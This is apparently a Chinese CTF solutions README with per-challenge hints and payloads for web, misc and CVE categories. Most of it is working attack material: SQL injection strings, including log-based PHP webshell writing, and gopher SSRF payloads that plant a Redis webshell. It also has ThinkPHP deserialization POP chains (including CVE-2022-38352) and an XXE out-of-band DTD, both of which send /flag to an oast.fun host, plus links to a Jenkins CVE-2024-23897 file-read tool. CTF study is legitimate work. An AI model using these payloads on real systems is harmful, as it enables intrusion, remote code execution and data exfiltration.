# 思路

## 信息收集
### 信息收集-001
> F12 -> fsdsadfhedcjscsdd.txt
### 信息收集-002
> F12
### 信息收集-003
> 禁用F12、右键
### 信息收集-004
> robots.txt
### 信息收集-005
> F12 -> 目录扫描
### 信息收集-006
> 备份 -> www.tar.gz
### 信息收集-007
> 备份 -> index.php.bak
### 信息收集-008
> vim备份 .index.php.swp
### 信息收集-009
> .git 泄露
### 信息收集-010
> 响应头
### 信息收集-011
> F12 爆破 `*.jpg`

## HTTP
### HTTP-001
> F12 -> /flag/index.php
### HTTP-002
> User-Agent: wjlin0
### HTTP-003
> Cookie: username=admin;
### HTTP-004
> 302 -> flag.php
### HTTP-005
> POST 方法
### HTTP-006
> Referer：https://flag.com
### HTTP-007
> response header `Access-Control-Allow-HINT: /api/flag.php`
```bash
curl https://ip:port/api/flag.php -H "Content-Type: application/json" -d '{"flag":  "2"}'
```
### HTTP-008
> X-Forwarded-For: 127.0.0.1
### HTTP-009
> `Cookie: username=admin` -> `POST` -> `User-Agent: wjlin0` -> `REFERER: flag.com` -> `X-Forwarded-For: 127.0.0.1`
### HTTP-010
> response header `HINT: hint.php` -> `hint.php` -> `http://ip:port/index.php?url=http://127.0.0.1/hint.php`
### HTTP-011
> get传参 d1=flag
### HTTP-012
> post传参 d2=flag
### HTTP-013
> 单参数爆破
### HTTP-014
> 多参数爆破
### HTTP-015
> 多参数爆破 md5加密

## PHP基础
### PHP基础-001
> GET、POST传参 `?f=1`
### PHP基础-002
> GET、POST传参数组 `?flag[0]=nalai`
### PHP基础-003
> 快速提交
```python3
import re

import requests

url = "http://ip:port/api.php"

text = requests.get(url,headers={
    "cookie": "PHPSESSID=58ed338efce21ca94b5efe091b2bda81"
})
data = {
    "userAnswer":eval(re.findall("(.*?) = \?",text.text)[0])}
text = requests.post(url,headers={
    "cookie": "PHPSESSID=58ed338efce21ca94b5efe091b2bda81"
},data=data)
print(text.text)
```
### PHP基础-004
> 弱类型转换
### PHP基础-005
> 编码 base32 -> base64
### PHP基础-006
> 弱比较 进制转换 ?password=0xdeadc0de
### PHP基础-007
> %0a 换行绕过 preg_match匹配
### PHP基础-008
> url二次编码
### PHP基础-009
> 数组绕过 strlen判断
> `?filename[]=index.php&contents[]=<?php%20system(%27cat%20/flag%27)?>`
### PHP基础-010
> 弱类型转换，科学基数 num=2e4
### PHP基础-011
> 8进制转换10进制 绕过intval `03747`
### PHP基础-012
> 弱类型转换，只要md5加密后的结果为0e科学技术开头，弱比较就会认为是0 `md5_1=QNKCDZO&md5_2=240610708`
### PHP基础-013
> 考察数组md5加密时为NULL `md5_1[]=1&md5_2[]=`
### PHP基础-014
> 自身0e开头 且 md5加密也是0e开头 `?md5=0e215962017`
### PHP基础-015
> in_array弱比较绕过，命令执行 `?size=5;cat%20/flag;#`
### PHP基础-016
> %0a绕过preg_match `username=admin%0a`
### PHP基础-017
> 数组绕过preg_match、strpos `?username[]=admin`
### PHP基础-018
> preg_match回溯次数超过100万 返回false
```py
import requests
url = "http://ip:port/"
username = "<?php system('cat /flag');//"+"a"*1000000
requests.post(url,data={
    "username": username,
})
resp = requests.get(f"{url}shell.php")
print(resp.text)
```
### PHP基础-019
> 动态函数调用 `?name=readflag`
### PHP基础-020
> PHP函数注册 `password=1&name=\%00readflag/var/www/html/index.php:9$0`
> 详情可看 -> https://www.leavesongs.com/PENETRATION/php-challenge-2023-oct.html#opline
### PHP基础-021
> 在5.x 版本中 preg_replace`/e`模式,结果会带入eval函数中执行 ?username=var_dump($flag)
### PHP基础-022
> 变量覆盖 `?password[username]=wjlin0`
### PHP基础-023
> 变量覆盖 `?suces=flag&flag=`
### PHP基础-024
> md5碰撞 找两个不同文件但md5相同即可
```shell
docker run --rm -it -v $PWD:/work -w /work -u $UID:$GID brimstone/fastcoll  -o msg1.bin msg2.bin
```
### PHP基础-025
> 基础的文件包含分析

```http request
GET /?page=data:,x/profile HTTP/1.1
Host: ip:port
User-Agent: <?php system('cat /flag');?>
X-Forwarded-For: data:,x
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close

```

### PHP基础-026

> 基础签到题

```http
GET /source.php?file=source.php?/../../../../ffffllllaaaagggg HTTP/1.1
Host: ip:port
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close


```



## SQL注入

### SQL注入-001
> 万能密码 `?username=admin' or 1=1 --+&password=1`
### SQL注入-002
> int型SQL注入 `?id=-1 union select 1,(select flag from ctf.flag),3 --+`
### SQL注入-003
> 字符型SQL注入 `?id=-1' union select 1,(select flag from ctf.flag),3 --+`
### SQL注入-004
> 双引号 `?id=-1" union select 1,(select flag from ctf.flag),3 --+`
### SQL注入-005
> 括号 `?id=-1) union select 1,(select flag from ctf.flag),3 --+`
### SQL注入-006
> 简单bool型
> 单引号括号 `?id=-1') union select 1,(select flag from ctf.flag),3 --+`
### SQL注入-007
> 简单bool型
```text
?id=1 order by 3 --+ # 查当前字段 
?id=1 and length(database()) = 3 --+ # 查询当前数据库长度
?id=1 and length(@@version_compile_os)< {10} --+ #查询操作系统字符长度
?id=1 and length(version())< {10} --+ #查询mysql版本字符长度
?id=1 and length(database())< {10} --+ #查询当前库字符长度
?id=1 and ascii(substr(sql语句,{1},1))={100} --+ #综合类查询
```
### SQL注入-008
> 时间型
```text
?id=1 and if (ascii(substr(sql语句,{1},1)={1},1,sleep(5)) # 与sqlmap一致 休眠即可
```
### SQL注入-009
> 报错注入 extractvalue、updaxml 有长度限制 可以采用倒叙
```text
?id=1 or extractvalue(0x0a,concat(0x0a,(select group_concat(flag) from ctf.flag)))--+
?id=1 or extractvalue(0x0a,concat(0x0a,(select REVERSE(group_concat(flag)) from ctf.flag)))--+
```
### SQL注入-010
> 堆叠注入
```text
?id=-1;select * from ctf.flag;
```
### SQL注入-011
> 二次注入 先注册一个 为 `admin'#`的账户 ，后面修改它的密码，即修改admin的密码;
### SQL注入-012
> 宽字节注入 利用`%df`和转义符`\\`构成汉字进行利用
> ?id=-1%df' union select 1,(select group_concat(flag) from ctf.flag),3 --+
### SQL注入-013
> 过滤了 ` （空格）+（加号）` 可以用 注释 `/**/` 绕过
> `?id=-1'/**/union/**/select/**/1,(select/**/group_concat(flag)/**/from/**/ctf.flag),3/**/%23`
### SQL注入-014
> 过滤了 `,` 可以与 join 起 配合别名
> `?id=-1' union select * from (select 1)A join((select group_concat(flag) from ctf.flag)B join(select 3)C) --+`
### SQL注入-015
> 文件读写, `?id=-1' union select 1,2,(select load_file('/flag'))--+`
### SQL注入-016
> 基于日志写入shell，由于 /flag的权限为400 无法直接读取，而 `/cat_flag` 可以直接运行获取 /flag的内容 故以下命令
```text
/index.php?id=1;set%20global%20general_log%20=%20on;set%20global%20general_log_file%20=%20%27/var/www/html/info.php%27;show%20variables%20like%20%27%general%%27;
    /index.php?id=1 and select '<?php eval($_GET[1]);?>';
/info.php?1=system('/cat_flag');
```
> 或者利用慢日志查询 直接写shell
```shell
show variables like '%slow_query_log%';		--查看慢查询信息
set global slow_query_log=1;				--启用慢查询日志(默认禁用)
set global slow_query_log_file='/var/www/html/info.php';	--修改日志文件路径
select '<?php @eval($_GET[1]);?>' or sleep(11);
/info.php?1=system('/cat_flag');
```
### SQL注入-017
> postgresql int类型注入 
```text 

?id=-1 UNION select null,string_agg(tablename, ','),null from pg_tables where schemaname='public' # 查表
?id=-1 union select null,string_agg(column_name, ','),null from information_schema.columns where table_schema='public' and table_name='users' # 查列
?id=-1 UNION ALL SELECT NULL,(COALESCE(CAST(flag AS VARCHAR(10000))::text,(CHR(32)))),NULL FROM public.flag--+

```
### SQL注入-018
> postgresql 字符串类型注入 `?id=-1' UNION ALL SELECT NULL,(COALESCE(CAST(flag AS VARCHAR(10000))::text,(CHR(32)))),NULL FROM public.flag--+`
### SQL注入-019
> postgresql bool类型注入
```python
# ?id=-1 and ascii(substring((sql语句),{1}},1)) = {2};
```
## SSRF

### SSRF-001
> `proxy=http://127.0.0.1:80/flag.php`

### SSRF-002
> 回环地址写法，不止`127.0.0.1`
```text
proxy=http://127.1/flag.php
```

### SSRF-003
> 将`127.0.0.1`进行转换，转换为其他进制的数从而绕过检测
> 进制转换结果如下
```text
0177.0.0.1 //八进制
0x7f.0.0.1 //十六进制
2130706433 //十进制
```

### SSRF-004
> 特征
```text
proxy=http://127.0.0.1./flag.php 
```

### SSRF-005
> 特征
```text
proxy=http://127.0.0.1:85/flag.php 
```

### SSRF-006
gopher 协议 攻击 内网 

**mysql**

工具: [gopherus](https://github.com/tarunkant/Gopherus)
```text
proxy=gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%1c%00%00%00%03%75%73%65%20%63%74%66%3b%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%66%6c%61%67%3b%01%00%00%00%01
```

### SSRF-007
gopher 协议 攻击 内网

**redis**

工具: [gopherus](https://github.com/tarunkant/Gopherus)
```text
proxy=gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%1c%00%00%00%03%75%73%65%20%63%74%66%3b%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%66%6c%61%67%3b%01%00%00%00%01
```

### SSRF-008
gopher 协议 攻击 内网

**redis**

```text
curl -X POST http://127.0.0.1:1408/ -d 'proxy=gopher://127.0.0.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252434%250D%250A%250A%250A%253C%253Fphp%2520system%2528%2524_GET%255B%2527cmd%2527%255D%2529%253B%2520%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A'
curl http://127.0.0.1:1408/shell.php?cmd=cat+/flag
```

## 反序列化

### 反序列化-PHP-001
```php 
<?php
class Show
{
    public $show;
    public function __construct($show)
    {
        $this->show = $show;
    }
}
$show = new Show('system("cat /flag");');
echo base64_encode(serialize($show));
```

### 反序列化-PHP-002
```php 
<?php
class User
{
    public $username;
    public function __construct($username)
    {
        $this->username = $username;
    }
}

class Show
{
    public $show;
    public function __construct($show)
    {
        $this->show = $show;
    }
}
$user = new User('system("cat /flag");');
$show = new Show($user);

echo base64_encode(serialize($show));

```

### 反序列化-PHP-003
```php
<?php

class ZhangSan
{
    public $name;
    public function __construct($name)
    {
        $this->name = $name;
    }
}

class User
{
    public $username;
    public function __construct($username)
    {
        $this->username = $username;
    }
}

class Show
{
    public $show;
    public function __construct($show)
    {
        $this->show = $show;
    }
}


$zhangsan = new ZhangSan('system("cat /flag");');
$user = new User($zhangsan);
$show = new Show($user);
var_dump($show);
echo base64_encode(serialize($show));
```

### 反序列化-PHP-004
> CVE-2016-7124
```php
<?php

class ZhangSan
{
    public $name;
    public function __construct($name)
    {
        $this->name = $name;
    }
}

class User
{
    public $username;
    public function __construct($username)
    {
        $this->username = $username;
    }
}

class Show
{
    public $show;
    public function __construct($show)
    {
        $this->show = $show;
    }
}


$zhangsan = new ZhangSan('system("cat /flag");');
$user = new User($zhangsan);
$show = new Show($user);
$tmp = serialize($show);
// 正则替换
$tmp = preg_replace('/"Show":1/','"Show":2',$tmp);
echo base64_encode($tmp);
```

### 反序列化-PHP-005
> php引用赋值&
```php
<?php

class ZhangSan
{
    public $name;
    public function __construct($name)
    {
        $this->name = $name;
    }
}

class User
{
    public $username;
    public function __construct($username)
    {
        $this->username = $username;
    }
}

class Show
{
    public $show;
    public $key;
    public $wakeup;
    public function __construct($show)
    {
        $this->key = &$this->wakeup;
        $this->show = $show;
        
    }
}


$zhangsan = new ZhangSan('system("cat /flag");');
$user = new User($zhangsan);
$show = new Show($user);
$tmp = serialize($show);
echo base64_encode($tmp);
```

### 反序列化-PHP-006
> fast-destruct
>
> `unserialize()`函数在扫描到序列化字符串格式有误时会提取触发对象的`__destruct()`方法导致命令执行
```php
<?php

class ZhangSan
{
    public $name;
    public function __construct($name)
    {
        $this->name = $name;
    }
}

class User
{
    public $username;
    public function __construct($username)
    {
        $this->username = $username;
    }
}

class Show
{
    public $show;
    public function __construct($show)
    {
        $this->show = $show;
    }
}


$zhangsan = new ZhangSan('system("cat /flag");');
$user = new User($zhangsan);
$show = new Show($user);
$tmp = serialize($show);
// 在 最后添加一个 ;1}}}
$tmp = preg_replace('/;}}}$/',';1}}}',$tmp);
echo base64_encode($tmp);
```

### 反序列化-PHP-007
> 使用C绕过
```php
<?php
class Show
{
    public $show;
    public function __construct($show)
    {
        $this->show = $show;
    }
}
$show = new Show('system("cat /flag");');
//$arr = array("xxx"=>$show);
$aro =new ArrayObject($show);

echo base64_encode(serialize($aro));

```

### 反序列化-PHP-008
> thinkphp v5.1.37 反序列化漏洞
>
> www.zip 获取源码
```php
<?php

namespace think;
abstract class Model{
    protected $append = [];
    private $data = [];
    function __construct(){
        $this->append = ["ethan"=>["a","2"]];
        $this->data = ["ethan"=>new Request()];
    }
}
class Request
{
    protected $hook = [];
    protected $filter = "system";
    protected $config = ["var_pjax"=>''];
    protected $param = ["curl http://sxielvzhzqayslxhetklcq64byiulay79.oast.fun -d \"$(cat /flag)\""];
    protected $mergeParam =true;
    function __construct(){
        $this->hook = ["visible"=>[$this,"isPjax"]];
    }
}
namespace think\process\pipes;

use think\model\concern\Conversion;
use think\model\Pivot;
class Windows
{
    private $files = [];

    public function __construct()
    {
        $this->files=[new Pivot()];
    }
}
namespace think\model;

use think\Model;

class Pivot extends Model
{
}
use think\process\pipes\Windows;
echo base64_encode(serialize(new Windows()));

```

### 反序列化-PHP-009
> thinkphp v5.1.37 反序列化漏洞 POC 2
>
> www.zip 获取源码
```php
<?php
namespace think;
abstract class Model {

    protected $append = [];
    private $relation = [];
    protected $visible = [];
    protected $strict = true;
    private $data = [];
    private $withAttr = [];
    function __construct(){
           $this->visible = array("foo"=>array());
           $this->relation = array("foo"=>"curl http://sxielvzhzqayslxhetklcq64byiulay79.oast.fun -d \"$(cat /flag)\"");
           $this->withAttr = array("foo"=>"system");
    }
}

namespace think\model;
use think\Model;
class Pivot extends Model {

}

namespace think\process\pipes;

use think\model\Pivot;
class Windows
{
    private $files = [];

    public function __construct()
    {
        $this->files=[new Pivot()];
    }
}





use think\process\pipes;
echo base64_encode(serialize(new Windows()));
```

### 反序列化-PHP-010
> thinkphp  (topthink/think-orm =  v2.0.24 ) 反序列化漏洞 POC 
>
> www.zip 获取源码
```php
<?php

namespace think;
abstract class Model {

    private $lazySave = false;
    private $exists = false;
    private $data = [];
    protected $suffix = "";
    protected $name = null;
    protected $connection = "mysql";

    protected $append = [];
    private $relation = [];
    protected $visible = [];
    protected $strict = true;
    private $withAttr = [];


    function __construct($obj){
        if ($obj == null) {
            $this->visible = array("foo"=>array());
            $this->relation = array("foo"=>"curl http://sxielvzhzqayslxhetklcq64byiulay79.oast.fun -d \"$(cat /flag)\"");
            $this->withAttr = array("foo"=>"system");
        }else{
            $this->lazySave = true;
            $this->exists = true;
            $this->data= array("foo"=>"");
            $this->name=$obj;
        }


    }
}






namespace think\model;
class Pivot extends \think\Model{

}

namespace think\model;
echo base64_encode(serialize(new Pivot(new Pivot(null))));

```

### 反序列化-PHP-011
> Thinkphp CVE-2022-38352
```php
<?php
namespace think\view\driver;
class Php
{
}

namespace think;
class App {
    protected $instances = [];

    public function __construct()
    {
        $this->instances = [
            "think\Request"=>new Request(),
        ];

    }
}
class Request {
    protected $url;

    public function __construct()
    {
        $this->url = '<?php system("cat /flag");exit(); ?>';
    }
}


namespace think\log\driver;
use think\App;
use think\view\driver\Php;

class Socket {
    protected $config;
    protected $app;
    protected $clientArg;
    public function __construct()
    {
        $this->config = [
            "force_client_ids" => true,
            "allow_client_ids"=> [],
            "debug" => true,
            "format_head"=> [new Php(),"display"]
        ];
        $this->app = new App();
        $this->clientArg = ["tabid"=>"1"];
    }
}


namespace think\log;
use think\log\driver\Socket;

class Channel {
    protected $logger;
    protected $lazy = false;
    public function __construct()
    {
        $this->lazy = false;
        $this->logger = new Socket();
    }
}


namespace League\Flysystem\Cached\Storage;


use think\log\Channel;

class Psr6Cache
{
    protected $autosave = false;
    private $pool;
    function __construct(){
        $this->pool =new Channel();
    }

}


echo base64_encode(serialize(new Psr6Cache()));
```

## XXE

### XXE-PHP-001

> `先上传data.xml，发现/uploads/data.xml已经有原本文件，无法覆盖。通过"查看学籍数据"按钮发现index?file=可以加载任意xml文件。`
>
> `网页访问/uploads/data.xml找到原本xml文本数据格式，将可以页面回显的标签修改成XXE-payload。上传 data2.xml 成功后，通过index?file=data2.xml`
```xml

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE class [
<!ELEMENT class ANY >
<!ENTITY xxe SYSTEM "file:///flag" >]>
<class>
    <student>
        <name>flag</name>
        <year>&xxe;</year>
        <school>heihei</school>
    </student>
</class>
```


### XXE-PHP-002

> `与上一题类似的无回显XXE版本。考察无回显XXE下使用OOB带外获取数据，用XXE-OOB-payload带出到ceye或者vps上即可。`

dtd.xml 
```xml
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag">
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://sxielvzhzqayslxhetklcq64byiulay79.oast.fun/?result=%file;'>">
```
data.xml
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
        <!ENTITY % dtd SYSTEM 'http://127.0.0.1:80/uploads/dtd.xml'>%dtd;%all;%send;
        ]>
<class>
    %dtd;
</class>

```

## MISC

### 图片隐写-001

> 拼接

winhex (010 editor) 打开 

![img.png](./img/README/img.png)

### 图片隐写-002

> Exif信息

winhex (010 editor) 打开 

![img.png](./img/README/img-2627657.png)

也可使用[ExifTool](https://www.rmnof.com/article/exiftool-introduction/)查看

![img.png](./img/README/img2.png)

### 图片隐写-003

> lsb隐写

使用工具[Stegsolve.jar](http://www.caesum.com/handbook/Stegsolve.jar) 解密

![img.png](./img/README/img-2627681.png)

也可使用python脚本

```python3
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from PIL import Image


def decode_lsb(image_path):
    """Decode message from image using LSB."""
    img = Image.open(image_path)
    width, height = img.size
    binary_message = ''

    for y in range(height):
        for x in range(width):
            pixel = img.getpixel((x, y))
            for value in pixel:
                binary_message += str(value & 1)

    # Find the end of message marker
    end_index = binary_message.find('1111111111111110')
    message = binary_to_string(binary_message[:end_index])

    return message


def binary_to_string(binary_str):
    """Convert binary string to text."""
    return ''.join(chr(int(binary_str[i:i + 8], 2)) for i in range(0, len(binary_str), 8))


# Example usage
image_path = "123.png"


# Decode message from image
decoded_message = decode_lsb("ctf.png")
print("Decoded message:", decoded_message)

```

### 图片隐写-004

> 修复文件头

修复png图片的文件头
![img.png](./img/README/img-2627715.png)

打开图片，即可得到flag
![img_1.png](./img/README/img_1.png)

### 图片隐写-005

> 高度被修改，依据正确的CRC爆破出正确的长度

![img.png](./img/README/img-2627780.png)

```shell
python3 main.py ctf.png
```

```python
#!/usr/bin/env python3
import binascii
import os
import random
import string
import struct
import sys
import zlib


def randStr(length=16):
    # 生成随机字节序列
    visible_chars = string.digits + string.ascii_lowercase
    random_string = ''.join(random.choice(visible_chars) for _ in range(length))
    return random_string


def main():
    filename = sys.argv[1]
    with open(filename, 'rb') as f:
        data = f.read()
    if bytes.fromhex('89504E47') != data[:4]:
        print("Invalid PNG file")
        return
    high = int.from_bytes(data[16:20], byteorder='big')
    width = int.from_bytes(data[20:24], byteorder='big')
    crc_png = data[29:33]
    print(f"当前图片中的CRC、high、width: {crc_png.hex()} {high} {width} ")
    crc_old = zlib.crc32(data[12:29]) & 0xffffffff
    if crc_old == int.from_bytes(crc_png, "big"):
        print("CRC校验正确")
        return

    crc_input = input(f"CRC校验错误，请输入正确的CRC值，或者输入yes使用默认值(default {crc_png.hex()})")
    if crc_input == "" or crc_input.startswith("ye"):
        crc_input = crc_png
    else:
        crc_input = crc_input.encode()
    flag = False
    for i in range(9999):
        if flag: break
        for j in range(9999):
            data2 = data[12:16] + struct.pack('>i', i) + struct.pack('>i', j) + data[24:29]
            crc = zlib.crc32(data2) & 0xffffffff
            if crc == int.from_bytes(crc_input, "big"):
                print(f"找到正确的CRC值: {crc}")
                data3 = data[:16] + struct.pack('>i', i) + struct.pack('>i', j) + data[24:29] + crc.to_bytes(4,
                                                                                                             'big') + data[
                                                                                                                      33:]
                filename = randStr(10) + ".png"
                print(f"生成的文件: {filename}")
                with open(filename, 'wb') as f:
                    f.write(data3)
                flag = True
                break


if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("Usage: %s <filename>" % sys.argv[0])
        sys.exit(1)
    main()

```

### 图片隐写-006

> 二维码取反色
> 可以看到三个白色酷似二维码的定位符，于是去反色。

```shell
python3 main.py
```

```python
from PIL import Image

def invert_colors(image_path, output_path):
    # 打开图像
    image = Image.open(image_path)

    # 取得图像的尺寸
    width, height = image.size

    # 创建一个新的空白图像，用于存储反转颜色后的图像
    inverted_image = Image.new('RGBA', (width, height))

    # 遍历图像的每一个像素，并反转其颜色
    for x in range(width):
        for y in range(height):
            # 获取当前像素的RGBA值
            r, g, b, a = image.getpixel((x, y))
            # 反转颜色
            inverted_color = (255 - r, 255 - g, 255 - b, a)
            # 将反转后的颜色应用到新图像的对应位置
            inverted_image.putpixel((x, y), inverted_color)

    # 保存反转颜色后的图像
    inverted_image.save(output_path)

# 使用示例
image_path = 'ctf.png'  # 输入图像路径
output_path = 'ctf_inverted_image.png'  # 输出图像路径
invert_colors(image_path, output_path)

```

或者部分手机的照片自动识别取反后的二维码如

![img.png](./img/README/img-2627809.png)

### 图片隐写-007

>  使用以下命令后会自动生成 output文件夹，其中就有分离出的文件。

```shell
foremost ctf.png
```



![img.png](./img/README/img-2627829.png)



### 文档隐写-001

> 白底字
> 改成黑色后即可看到

![img.png](./img/README/img-3159019.png)





### 文档隐写-002

> snow加密

使用工具`snow`工具，可将flag提取出来。

![img.png](./img/README/img-3159036.png)





### 音频隐写-001

> 音频隐写 摩丝密码

打开ctf.mp3 后发现酷似摩丝密码，于是使用`audacity` 依据音频写出摩丝密码

![img.png](./img/README/img-3159052.png)


```text
..-./.-../.-/--./----.--/-----/---../...../...--/..-./..---/.-/.----/---../.----/-.-./..---/-----/.----/--.../.-/..-./--.../-----/..---/-----/-.-./----./.-/.-/---../-.../...--/./...../-.../---../-----.-
```

解码后

```text
FLAG%u7b0853F2A181C2017AF7020C9AA8B3E5B8%u7d
```

%u7b、%u7d 是 `{`,`}`

### ZIP隐写-001

> 伪加密

修改 通用位标记 `(General purpose bit flag)`  为 00后打开，macos/linux 可直接打开无需密码 

![img.png](./img/README/img-3159122.png)

### ZIP隐写-002

> 暴力破解


```shell
fcrackzip -b -l 5 -ca  -u ctf.zip
```

![img.png](./img/README/img-3160332.png)

### 流量隐写-001

> sql注入-流量隐写

利用 `strings` 命令可直接提取HTTP请求中的内容

![img.png](./img/README/img-3427877.png)


或者利用python 直接可提取

```python
import re

import pyshark
from urllib.parse import unquote

filter_expr = "http && http.request.full_uri"
cap = pyshark.FileCapture('sqli.pcapng', display_filter=filter_expr)
# 遍历数据包并打印摘要信息
requests_uris = []

for packet in cap:
    request_uri = packet.http.request_uri
    # url解码
    request_uri = unquote(request_uri)
    if 'ascii(substring' in request_uri:
        requests_uris.append(request_uri)
cap.close()
nums = {}
print(requests_uris)
flag = ""
for u in requests_uris:
    f_ord = re.findall(r',1\)\)=(.*)', u)[0]
    flag += chr(int(f_ord))
print(flag)

```

```text
flag{7a9acaf0-f8c8-d171-8b13-6f72ec91a21e}
```

### 流量隐写-002

> sql注入-流量隐写

利用 `strings` 命令可直接提取wireshark中的`strings`，发现疑似`rsa`加密

![img.png](./img/README/img-3754530.png)

使用wireshark查看后发现，果然为`aes`加密通讯

![image-20240418175951419](./img/README/image-20240418175951419.png)

可使用在线工具进行解密[AES](https://tool.lmeee.com/jiami/aes)

![image-20240418180250253](./img/README/image-20240418180250253.png)

![image-20240418180324936](./img/README/image-20240418180324936.png)

![image-20240418180339928](./img/README/image-20240418180339928.png)

也可使用`python`脚本

```python
import base64
import json
import re

import pyshark
from urllib.parse import unquote

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad


# 加密函数
def encrypt(key, message):
    cipher = AES.new(key, AES.MODE_ECB)
    padded_plaintext = pad(message, AES.block_size)
    return base64.b64encode(cipher.encrypt(padded_plaintext)).decode("utf-8")


def decrypt(key, encrypted_message):
    cipher = AES.new(key, AES.MODE_ECB)
    text = cipher.decrypt(base64.b64decode(encrypted_message))
    return unpad(text, AES.block_size).decode("utf-8")
filter_expr = "tcp"
cap = pyshark.FileCapture('ctf.pcapng', display_filter=filter_expr)
# 遍历数据包并打印摘要信息
payloads = []
for pkt in cap:
    # 检查数据包是否为 TCP 协议
    if 'TCP' in pkt:
        # 访问 TCP 层信息
        tcp_layer = pkt['TCP']
        # 打印 TCP 载荷（数据）
        if hasattr(tcp_layer, 'payload') and tcp_layer.payload is not None:
            # 打印 TCP 载荷（数据）
            payload = bytes.fromhex(tcp_layer.payload.replace(":", ""))
            payloads.append(payload)

info_key = json.loads(payloads[0])['key']
print(info_key)
for i in range(1,len(payloads)):
    print(decrypt(info_key.encode("utf-8"),payloads[i].decode("utf-8")))
    



```



### 流量隐写-003

> 冰蝎 php流量加密

通过流量包分析得到，是通过`upload.php`上传的恶意文件，并能看出来酷似冰蝎加密的一句话木马

![image-20240422142820159](./img/README/image-20240422142820159-3768984.png)

查看后续利用发现为加密的流量，简单编写编写解密的脚本

![image-20240422145809175](./img/README/image-20240422145809175.png)

解密出的代码是执行了代码的

![image-20240422143851640](./img/README/image-20240422143851640.png)

解密后续流量，得到执行命令后的结果

![image-20240422144406798](./img/README/image-20240422144406798.png)

![image-20240422145416365](./img/README/image-20240422145416365.png)






## CVE

### CVE-2022-38352
> CVE-2022-38352

目录扫描发现 `www.zip`，下载后发现存在`unserialize`，利用 `CVE-2022-38352` 反序列化链构造POC

```php
<?php
namespace think\view\driver;
class Php
{
}

namespace think;
class App {
    protected $instances = [];

    public function __construct()
    {
        $this->instances = [
            "think\Request"=>new Request(),
        ];

    }
}
class Request {
    protected $url;

    public function __construct()
    {
        $this->url = '<?php system(\'curl \');exit(); ?>';
    }
}


namespace think\log\driver;
use think\App;
use think\view\driver\Php;

class Socket {
    protected $config;
    protected $app;
    protected $clientArg;
    public function __construct()
    {
        $this->config = [
            "force_client_ids" => true,
            "allow_client_ids"=> [],
            "debug" => true,
            "format_head"=> [new Php(),"display"]
        ];
        $this->app = new App();
        $this->clientArg = ["tabid"=>"1"];
    }
}


namespace think\log;
use think\log\driver\Socket;

class Channel {
    protected $logger;
    protected $lazy = false;
    public function __construct()
    {
        $this->lazy = false;
        $this->logger = new Socket();
    }
}


namespace League\Flysystem\Cached\Storage;


use think\log\Channel;

class Psr6Cache
{
    protected $autosave = false;
    private $pool;
    function __construct(){
        $this->pool =new Channel();
    }

}


echo base64_encode(serialize(new Psr6Cache()));
```

### CVE-2024-23897
> CVE-2024-23897 jenkins 存在任意文件读取

下载工具

- [macOS-arm64](https://github.com/wjlin0/CVE-2024-23897/releases/download/v1.0.2/CVE-2024-23897_1.0.2_macOS_arm64.zip)

- [macOS-amd64](https://github.com/wjlin0/CVE-2024-23897/releases/download/v1.0.2/CVE-2024-23897_1.0.2_macOS_amd64.zip)

- [linux-amd64](https://github.com/wjlin0/CVE-2024-23897/releases/download/v1.0.2/CVE-2024-23897_1.0.2_linux_amd64.zip)

- [windows-amd64](https://github.com/wjlin0/CVE-2024-23897/releases/download/v1.0.2/CVE-2024-23897_1.0.2_windows_amd64.zip)

